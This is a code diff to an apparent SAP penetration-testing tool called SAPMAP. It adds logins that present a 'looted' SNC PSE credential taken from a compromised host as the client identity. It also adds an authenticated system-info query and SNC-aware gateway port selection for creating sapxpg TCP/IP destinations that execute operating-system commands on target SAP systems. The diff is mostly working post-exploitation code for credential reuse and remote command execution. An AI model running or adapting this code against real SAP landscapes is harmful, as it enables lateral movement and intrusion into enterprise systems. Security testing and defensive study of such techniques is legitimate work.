@@ -127,13 +127,25 @@ def set_pure_rfc(enabled: bool):
 # SNC when the operator has configured an identity.
 _snc_config = {"secudir": "", "sapcryptolib": "", "identity": ""}
 
+# Active LOOTED-PSE client identity (issue #137).  When set, this
+# overrides the global operator posture above as the SNC *client*
+# identity — SAPMAP presents a PSE pulled off a pwned box (typically
+# that box's own SAPSYS.pse, which the landscape's SNC ACL already
+# trusts) instead of the operator's own PSE.  A dict snapshot of a
+# SNCCredential.to_dict() (or None = use the operator posture).  Kept
+# as a SEPARATE module global from _snc_config so the existing
+# save/restore test fixtures (dict(_snc_config) -> set_snc_config(**d))
+# keep round-tripping unchanged.
+_snc_active_cred = None
+
 
 def set_snc_config(secudir: str = "", sapcryptolib: str = "",
                    identity: str = ""):
     """Mirror the global state's SNC posture into this module.
 
     Pass the SAPMAPState.snc_secudir / snc_sapcryptolib / snc_identity
-    values.  Empty strings clear a field.
+    values.  Empty strings clear a field.  The active looted-PSE
+    identity (set_snc_identity) is independent and untouched here.
     """
     global _snc_config
     _snc_config = {
@@ -143,25 +155,151 @@ def set_snc_config(secudir: str = "", sapcryptolib: str = "",
     }
 
 
+def set_snc_identity(cred: dict = None):
+    """Set (or clear) the ACTIVE looted-PSE SNC client identity (#137).
+
+    ``cred`` is a ``SNCCredential.to_dict()`` (the wallet entry selected
+    as active) or ``None`` to clear it and fall back to the global
+    operator posture.  When set, ``_snc_params_for`` presents this PSE
+    as the client identity for every SNC logon.
+    """
+    global _snc_active_cred
+    _snc_active_cred = dict(cred) if cred else None
+
+
+def _snc_native_available() -> bool:
+    """True when the active RFC backend is saprfclib (the pure-Python
+    backend), which supports the native SNC path (``snc_pse`` — no
+    CommonCryptoLib binary needed).  The C SDK backend does not, so a
+    looted PSE routes to the CommonCryptoLib (``snc_lib``) path there.
+    """
+    try:
+        backend = _get_rfc_backend()
+    except Exception:
+        return False
+    return "sap_rfc_pure" in (getattr(backend, "__module__", "") or "")
+
+
+def _pse_key_is_rsa(pse_path: str, pin: str = ""):
+    """Probe a PSE's private-key type, used to pick the SNC path (#137).
+
+    Returns ``True`` for an RSA key (the native ``snc_pse`` path works),
+    ``False`` for a non-RSA/EC key (CommonCryptoLib only, per
+    randomstr1ng/saprfclib#64), or ``None`` when it can't be determined
+    (saprfclib absent, unreadable/wrong-PIN/unsupported PSE).
+
+    Uses saprfclib's own PSE loader — the same parser the native SNC
+    path uses — so the verdict matches what a real connect would do.
+    """
+    try:
+        from saprfclib import pse as _pse
+    except Exception:
+        return None
+    try:
+        with open(pse_path, "rb") as _fh:
+            data = _fh.read()
+    except OSError:
+        return None
+    try:
+        _pse.load_pse(data, pin if pin != "" else None)
+        return True
+    except Exception as exc:  # pse.PseError and friends
+        msg = str(exc).lower()
+        if "only rsa" in msg or "not an rsa key" in msg:
+            return False
+        return None
+
+
+def _snc_params_for_looted(cred: dict, name: str) -> dict:
+    """Emit SNC connection params using a LOOTED PSE as the client
+    identity (#137).  ``name`` is the already-stripped target partner.
+
+    Path selection (``cred['path_pref']``):
+      * ``native``   → prefer the native pure-Python path (``snc_pse``).
+      * ``cryptolib``→ force the CommonCryptoLib path (``snc_lib``).
+      * ``auto`` (default) → native only when the key is affirmatively RSA
+        (``key_is_rsa is True``); an unprobed (None) or EC (False) key
+        routes to CommonCryptoLib, the safe default that works for every
+        key type.  Probe the key with ``_pse_key_is_rsa`` to populate it.
+
+    The native path (``snc_pse``) is a saprfclib-only capability, so it is
+    emitted ONLY when the active backend is the pure one
+    (``_snc_native_available``) — even under ``path_pref='native'``.
+    Emitting ``snc_pse`` to the C SDK (which has no such param) would make
+    it silently drop SNC and send the logon in the clear; so a forced
+    native on a non-native backend degrades to CommonCryptoLib instead.
+
+    The native path needs only the PSE file (+ PIN).  The CommonCryptoLib
+    path reuses the operator-configured ``sapcryptolib`` and requires the
+    looted PSE to be staged into the configured SECUDIR as the client
+    credential (same prerequisite as the operator-posture cryptolib path:
+    a local ``cred_v2`` minted for the PSE) — this routine only emits the
+    params, it does not stage.  It returns ``{}`` when no ``sapcryptolib``
+    is configured (SNC simply can't be negotiated).
+    """
+    pse_path = (cred.get("pse_path") or "").strip()
+    if not pse_path:
+        return {}
+    pref = (cred.get("path_pref") or "auto").strip().lower()
+    key_is_rsa = cred.get("key_is_rsa")       # True / False / None
+    if pref == "native":
+        want_native = True
+    elif pref == "cryptolib":
+        want_native = False
+    else:  # auto — native only for an affirmatively-RSA key
+        want_native = (key_is_rsa is True)
+    # Native (snc_pse) only on a backend that can actually honor it.
+    use_native = want_native and _snc_native_available()
+
+    params = {"snc_sso": "0", "snc_partnername": name}
+    identity = (cred.get("snc_identity") or "").strip()
+    if identity:
+        params["snc_myname"] = identity
+
+    if use_native:
+        params["snc_pse"] = pse_path
+        params["snc_pse_pin"] = cred.get("pin", "") or ""
+        cred_v2 = (cred.get("cred_v2_path") or "").strip()
+        if cred_v2:
+            params["snc_credential"] = cred_v2
+        return params
+
+    # CommonCryptoLib path — reuses the operator-configured crypto lib.
+    sapcryptolib = _snc_config.get("sapcryptolib", "")
+    if not sapcryptolib:
+        return {}
+    params["snc_lib"] = sapcryptolib
+    return params
+
+
 def _snc_params_for(snc_partnername: str) -> dict:
     """Return the SNC connection params to merge into an RFC logon, or {}.
 
-    Single source of truth for the SNC gating rule: SNC is negotiated only
-    when the operator has fully configured the global posture (SECUDIR,
-    sapcryptolib and our own SNC identity, via set_snc_config()) AND a
-    partner name is supplied.  Shared by _get_connection (which reads
-    node.snc_partnername) and rfc_check_credentials (which takes the name
-    as an explicit argument, since it has no SAPNode) so both negotiate
-    SNC identically.
+    Single source of truth for the SNC gating rule.  Shared by
+    _get_connection (which reads node.snc_partnername) and
+    rfc_check_credentials (which takes the name as an explicit argument,
+    since it has no SAPNode) so both negotiate SNC identically.
+
+    When a looted-PSE client identity is active (set_snc_identity, #137)
+    it takes precedence and the params present that PSE; otherwise SNC is
+    negotiated only when the operator has fully configured the global
+    posture (SECUDIR, sapcryptolib and our own SNC identity, via
+    set_snc_config()).  Either way a partner name must be supplied.
 
     snc_sso="0" means SNC secures the transport layer only — the
     credentials still authenticate at the application layer.
     """
+    name = (snc_partnername or "").strip()
+    if not name:
+        return {}
+    # Looted-PSE client identity overrides the operator posture (#137).
+    if _snc_active_cred:
+        return _snc_params_for_looted(_snc_active_cred, name)
+    # Operator posture (the original gate — unchanged behaviour).
     secudir = _snc_config.get("secudir", "")
     sapcryptolib = _snc_config.get("sapcryptolib", "")
     identity = _snc_config.get("identity", "")
-    name = (snc_partnername or "").strip()
-    if secudir and sapcryptolib and identity and name:
+    if secudir and sapcryptolib and identity:
         return {
             "snc_sso": "0",
             "snc_myname": identity,
@@ -307,10 +445,26 @@ def _get_connection(node: SAPNode, creds: Credentials = None,
     snc_params = _snc_params_for(node_snc_name)
     if snc_params:
         params.update(snc_params)
+        # CommonCryptoLib locates the client PSE + cred_v2 via the SECUDIR
+        # environment variable — the GSS provider reads it, the RFC params
+        # don't carry it.  Mirror the configured SECUDIR into the
+        # environment for the CommonCryptoLib (``snc_lib``) path; otherwise
+        # the handshake fails with GSS_S_FAILURE (0x00070000) acquiring the
+        # client credential (issue #167, confirmed live).  The native
+        # looted-PSE path (``snc_pse``, #137) needs no SECUDIR, so only
+        # mirror when a crypto lib is actually in play.
+        import os as _os
+        _secudir = _snc_config.get("secudir", "")
+        if _secudir and snc_params.get("snc_lib"):
+            _os.environ["SECUDIR"] = _secudir
+        # Diagnostic is path-agnostic: native uses snc_pse, CommonCryptoLib
+        # uses snc_lib, and snc_myname is optional — don't index keys that a
+        # given path omits (would KeyError on the native path).
+        _snc_path = "native" if snc_params.get("snc_pse") else "commoncryptolib"
         print(f"[*] {node.sid}: SNC params added to connection "
-              f"(snc_myname={snc_params['snc_myname']!r}, "
-              f"snc_partnername={snc_params['snc_partnername']!r}, "
-              f"snc_lib={snc_params['snc_lib']!r})")
+              f"(path={_snc_path}, "
+              f"snc_myname={snc_params.get('snc_myname', '')!r}, "
+              f"snc_partnername={snc_params.get('snc_partnername', '')!r})")
     else:
         missing = []
         if not _snc_config.get("secudir"):
@@ -412,6 +566,65 @@ def test_connection(node: SAPNode, creds: Credentials = None,
         elif "library" in err.lower() or "sdk" in err.lower() or "load" in err.lower():
             print(f"    SAP NW RFC SDK not found — set the SDK path in settings")
         return False
+
+
+# ---------------------------------------------------------------------------
+# Authenticated RFC_SYSTEM_INFO (issue #167 — SNC-aware system info)
+# ---------------------------------------------------------------------------
+
+def get_rfc_system_info(node: SAPNode, creds: Credentials = None,
+                        host_override: str = "") -> dict:
+    """Fetch RFC_SYSTEM_INFO over an AUTHENTICATED RFC logon.
+
+    This is the SNC-capable counterpart to the anonymous Stage-0 /
+    legacy raw-NI probes in ``sap_rfc_sysinfo_probe`` / ``sap_rfc_system_info``
+    (issue #167).  It goes through :func:`_get_connection`, which injects the
+    SNC parameters (``snc_lib`` / ``snc_myname`` / ``snc_partnername``) whenever
+    the global SNC posture is configured (``set_snc_config``) *and* this node
+    carries an SNC partner name.  With ``snc_lib`` set, the active backend
+    connects on the SNC gateway port (saprfclib: ``4800 + sysnr``), so the
+    call traverses the SNC layer transparently.
+
+    A truly anonymous RFC_SYSTEM_INFO is not possible over SNC — the SNC
+    transport comes up but the application-layer logon still runs, so valid
+    credentials (or an SNC-SSO cert mapped to a user) are required.  Hence
+    this is the authenticated path; discovery classifies SNC-only systems
+    separately when no credentials are available.
+
+    Returns a normalized dict:
+      ``{sid, hostname, ip, os_type, db_type, kernel, sap_release,
+         snc (bool), source, error}``
+    where ``source`` is ``"rfcsi_snc_auth"`` when SNC was negotiated, else
+    ``"rfcsi_auth"``; ``error`` is non-empty on failure (all other fields
+    blank).
+    """
+    out = {"sid": "", "hostname": "", "ip": "", "os_type": "", "db_type": "",
+           "kernel": "", "sap_release": "", "snc": False, "source": "",
+           "error": ""}
+    node_snc_name = (getattr(node, "snc_partnername", "") or "").strip()
+    snc_on = bool(_snc_params_for(node_snc_name))
+    out["snc"] = snc_on
+    try:
+        with _get_connection(node, creds, host_override=host_override) as conn:
+            info = conn.call("RFC_SYSTEM_INFO")
+            exp = info.get("RFCSI_EXPORT", info) if isinstance(info, dict) else {}
+            if not isinstance(exp, dict):
+                exp = {}
+
+            def _g(k):
+                return (exp.get(k, "") or "").strip()
+
+            out["sid"] = _g("RFCSYSID")
+            out["hostname"] = _g("RFCHOST2") or _g("RFCHOST")
+            out["os_type"] = _g("RFCOPSYS")
+            out["db_type"] = _g("RFCDBSYS")
+            out["kernel"] = _g("RFCKERNRL")
+            out["sap_release"] = _g("RFCSAPRL")
+            out["ip"] = _g("RFCIPV6ADDR") or _g("RFCIPADDR")
+            out["source"] = "rfcsi_snc_auth" if snc_on else "rfcsi_auth"
+    except Exception as e:
+        out["error"] = format_rfc_exception(e)
+    return out
 
 
 # ---------------------------------------------------------------------------
@@ -584,7 +797,15 @@ def rfc_check_credentials(host: str, sysnr: str, client: str,
 
     # SNC (issue #168): same gating rule as _get_connection, but the
     # partner name comes in as an argument since there is no SAPNode here.
-    params.update(_snc_params_for(snc_partnername))
+    _snc = _snc_params_for(snc_partnername)
+    params.update(_snc)
+    # CommonCryptoLib reads the client PSE/cred_v2 from SECUDIR (not the
+    # RFC params), so mirror it the same way _get_connection does when the
+    # snc_lib path is in play.  The native looted-PSE path (snc_pse, #137)
+    # needs no SECUDIR.
+    if _snc.get("snc_lib") and _snc_config.get("secudir"):
+        import os as _os
+        _os.environ["SECUDIR"] = _snc_config["secudir"]
 
     try:
         with RFCConnection(sdk_path=_sdk_path, **params) as conn:
@@ -6208,10 +6429,68 @@ def update_node_production_status(node: SAPNode, creds: Credentials = None):
 # TCP/IP destination creation (sapxpg remote test)
 # ---------------------------------------------------------------------------
 
+def _resolve_gateway_service(node, snc=None) -> str:
+    """Pick the gateway service port for a registered-program (sapxpg)
+    TCP/IP destination on ``node`` — SNC-aware (issue #172).
+
+    An SNC landscape exposes the gateway on gw/snc_port (4800+NN) and
+    typically firewalls the plain gateway (3300+NN).  The pre-#172 port
+    selection only matched ``gateway`` / 33NN, so on an SNC system the
+    sapxpg destination pointed at a dead / non-SNC port — the mysterious
+    connects to the non-SNC port reported in the issue.
+
+    Prefers the SNC gateway (``gateway_snc`` / 4800+NN) when SNC applies —
+    the global SNC posture is configured AND ``node.snc_partnername`` is
+    set (same gate as ``_snc_params_for``), or when ONLY an SNC gateway is
+    open — otherwise the plain gateway (3300+NN).  Falls back to a port
+    derived from the instance number when no gateway port was scanned.
+    Pass ``snc=True/False`` to force the decision (tests / callers that
+    already know the posture).
+    """
+    if snc is None:
+        snc = bool(_snc_params_for(getattr(node, "snc_partnername", "")))
+    plain = ""
+    snc_port = ""
+    for inst in (getattr(node, "instances", None) or []):
+        ports = _instance_field(inst, "ports") or {}
+        try:
+            items = list(ports.items())
+        except AttributeError:
+            items = []
+        for port, svc in items:
+            try:
+                pint = int(port)
+            except (TypeError, ValueError):
+                pint = -1
+            if svc == "gateway_snc" or (4800 <= pint <= 4899):
+                snc_port = snc_port or str(port)
+            elif svc == "gateway" or (3300 <= pint <= 3399):
+                plain = plain or str(port)
+    if snc and snc_port:
+        return snc_port
+    if snc_port and not plain:          # only the SNC gateway is open
+        return snc_port
+    if plain:
+        return plain
+    # No gateway port scanned — derive from the instance number.
+    nr = ""
+    for inst in (getattr(node, "instances", None) or []):
+        nr = _norm_instance_nr(_instance_field(inst, "instance_nr"))
+        if nr:
+            break
+    base = 4800 if snc else 3300
+    try:
+        return str(base + int(nr)) if nr else str(base)
+    except ValueError:
+        return str(base)
+
+
 def create_tcpip_destination(node: SAPNode, target_host: str,
                              target_sid: str = "",
                              target_gw_port: str = "",
-                             creds: Credentials = None) -> dict:
+                             creds: Credentials = None,
+                             *,
+                             snc_partnername: str = "") -> dict:
     """Create a TCP/IP destination for remote sapxpg execution.
 
     Args:
@@ -6220,6 +6499,27 @@ def create_tcpip_destination(node: SAPNode, target_host: str,
         target_sid: SID of the target (used in dest name)
         target_gw_port: gateway port of the target (e.g. "3300")
         creds: credentials to use on the source system
+        snc_partnername: when the target gateway enforces SNC, the
+            registered-program connection the destination will make
+            has to be SNC-secured itself — otherwise the gateway
+            refuses it even on the right port (part 2 of #172, the
+            SDEST E 017 symptom).  Pass the target's SNC partner name
+            (``node.snc_partnername``) and this routine adds
+            ``SNC_ACTIVE=X`` plus a nested ``SNC_PARAMETER`` struct
+            (``SNC_QOP=8`` / ``SNC_PNAME``) to the create call.
+            Empty / omitted = non-SNC destination (the pre-#172
+            behaviour; wire-compatible).  The gate is intentionally
+            just ``if snc_partnername:`` — the SM59 record's SNC
+            fields describe the server→target leg (how the server's
+            gateway secures its registered-program connection), which
+            is independent of SAPMAP's OWN logon-level SNC posture
+            (``_snc_params_for``).  Both are legitimate on a mixed
+            landscape: pyrfc creds for the source, SNC for the
+            target.  The SOAP envelope path uses the same simple
+            gate, so both transports produce identical SM59 records
+            for identical operator input.
+            Field shape confirmed by @supersache against a live
+            lab (SNC_PARAMETER sub-struct, SNC_QOP=8 = max).
 
     Returns dict with: success, message, dest_name
     """
@@ -6228,6 +6528,20 @@ def create_tcpip_destination(node: SAPNode, target_host: str,
     gw_service = target_gw_port or "3300"
 
     result = {"success": False, "message": "", "dest_name": dest_name}
+
+    # Simple gate: driven only by the target's partner name — the
+    # destination record's SNC fields describe the server→target leg,
+    # independent of how SAPMAP itself talks to the source.  Matches
+    # the SOAP envelope builder so both transports stay in lockstep.
+    snc_kwargs = {}
+    if snc_partnername:
+        snc_kwargs = {
+            "SNC_ACTIVE": "X",
+            "SNC_PARAMETER": {
+                "SNC_QOP": "8",         # max QoP (privacy + integrity + auth)
+                "SNC_PNAME": snc_partnername,
+            },
+        }
 
     try:
         with _get_connection(node, creds) as conn:
@@ -6241,6 +6555,7 @@ def create_tcpip_destination(node: SAPNode, target_host: str,
                 METHOD="E",
                 PROGRAM="sapxpg",
                 CPIC_TIMEOUT="20",
+                **snc_kwargs,
             )
             # Check result
             ret = create_result.get("RETURN", {})
@@ -6249,8 +6564,9 @@ def create_tcpip_destination(node: SAPNode, target_host: str,
             else:
                 result["success"] = True
                 result["message"] = f"TCP/IP destination {dest_name} created"
+                snc_tag = " SNC" if snc_kwargs else ""
                 print(f"[+] {node.sid}: Created TCP/IP dest {dest_name} → "
-                      f"{target_host} (gw={gw_service})")
+                      f"{target_host} (gw={gw_service}{snc_tag})")
     except Exception as e:
         result["message"] = format_rfc_exception(e)
         print(f"[-] {node.sid}: TCP/IP dest creation error: {format_rfc_exception(e)}")
@@ -6483,21 +6799,21 @@ def execute_local_command(node: SAPNode, command: str, params: str,
             result["error"] = "No IP/hostname for node"
             return result
 
-        # Find own gateway port
-        gw_port = None
-        for inst in node.instances:
-            for port, svc in inst.ports.items():
-                if svc == "gateway" or (3300 <= port <= 3399):
-                    gw_port = str(port)
-                    break
-            if gw_port:
-                break
-        if not gw_port:
-            gw_port = "3300"
+        # Pick the gateway port SNC-aware (#172): an SNC system exposes the
+        # gateway on gw/snc_port (4800+NN) and firewalls the plain 33NN
+        # gateway, so a self-referencing sapxpg dest must target the SNC
+        # port — otherwise the registered-program connection lands on a
+        # dead non-SNC port.
+        gw_port = _resolve_gateway_service(node)
 
         create_result = create_tcpip_destination(
             node, target_host=host, target_sid=node.sid,
             target_gw_port=gw_port, creds=creds,
+            # Part 2 of #172: when the gateway enforces SNC, the
+            # registered-program connection has to be SNC-secured
+            # itself (SDEST E 017 at use if not).  Pass the node's
+            # own partner name — the gate inside the helper decides.
+            snc_partnername=getattr(node, "snc_partnername", "") or "",
         )
         if not create_result["success"]:
             result["error"] = f"Could not create TCP/IP dest: {create_result['message']}"
